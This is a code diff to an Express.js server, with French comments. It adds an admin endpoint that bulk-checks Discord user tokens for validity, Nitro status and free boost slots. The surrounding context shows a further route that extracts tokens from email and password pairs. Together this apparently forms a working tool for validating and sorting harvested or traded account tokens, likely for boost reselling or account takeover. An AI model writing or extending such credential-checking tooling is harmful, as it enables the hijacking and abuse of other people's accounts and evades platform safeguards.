@@ -413,6 +413,59 @@ app.get('/api/admin/keys', adminAuth, (req, res) => {
   res.json([...db.keys].reverse().slice(0, 500));
 });
 
+// Check token valide / dead / nitro
+app.post('/api/admin/tokens/check', adminAuth, async (req, res) => {
+  const { tokens } = req.body;
+  if (!Array.isArray(tokens) || !tokens.length)
+    return res.status(400).json({ error: 'tokens array requis' });
+
+  const results = [];
+
+  for (const token of tokens) {
+    const t = token.trim();
+    if (!t) continue;
+
+    try {
+      const r = await fetch('https://discord.com/api/v9/users/@me', {
+        headers: discordHeaders(t)
+      });
+
+      if (r.status === 401 || r.status === 403) {
+        results.push({ token: t, status: 'dead', username: null, nitro: false, slots: 0 });
+        await sleep(300);
+        continue;
+      }
+
+      const user = await r.json();
+
+      // Check slots Nitro
+      const slotRes = await fetch('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', {
+        headers: discordHeaders(t)
+      });
+      const slots = await slotRes.json();
+      const freeSlots = Array.isArray(slots) ? slots.filter(s => !s.premium_guild_subscription && !s.canceled).length : 0;
+      const totalSlots = Array.isArray(slots) ? slots.length : 0;
+      const hasNitro = user.premium_type > 0;
+
+      results.push({
+        token: t,
+        status: 'valid',
+        username: `${user.username}${user.discriminator !== '0' ? '#' + user.discriminator : ''}`,
+        nitro: hasNitro,
+        nitro_type: user.premium_type === 2 ? 'Nitro' : user.premium_type === 1 ? 'Classic' : 'Aucun',
+        slots_free: freeSlots,
+        slots_total: totalSlots
+      });
+    } catch(e) {
+      results.push({ token: t, status: 'error', username: null, nitro: false, slots: 0 });
+    }
+
+    await sleep(400);
+  }
+
+  res.json({ results });
+});
+
 // Extract token depuis email + password Discord
 app.post('/api/admin/tokens/extract', adminAuth, async (req, res) => {
   const { accounts } = req.body;
